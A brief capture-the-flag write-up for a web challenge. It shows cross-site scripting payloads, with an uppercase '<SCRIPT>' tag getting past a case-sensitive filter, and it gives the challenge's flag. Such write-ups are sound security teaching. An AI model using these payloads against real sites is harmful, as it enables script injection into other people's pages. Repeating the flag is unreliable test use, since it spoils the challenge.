# Challenge Name:
 [*Cool Name Effect*](https://cybertalents.com/challenges/web/cool-name-effect)
 
# Challenge Description
Webmaster developed a simple script to do cool effects on your name, but his code not filtering the inputs correctly execute javascript alert and prove it.

Link: [http://34.77.37.110/cool-effect/](http://34.77.37.110/cool-effect/)

## Answer
* Try inject javascript code in the textbox
```
<script>alert()</script>
```
* The result was "<forbidden>alert()" which mean he filtered "script" so try in another word
```
<SCRIPT>alert()</SCRIPT>
```
* You got the Flag!!

 ## The Flag
 > ciyypjz
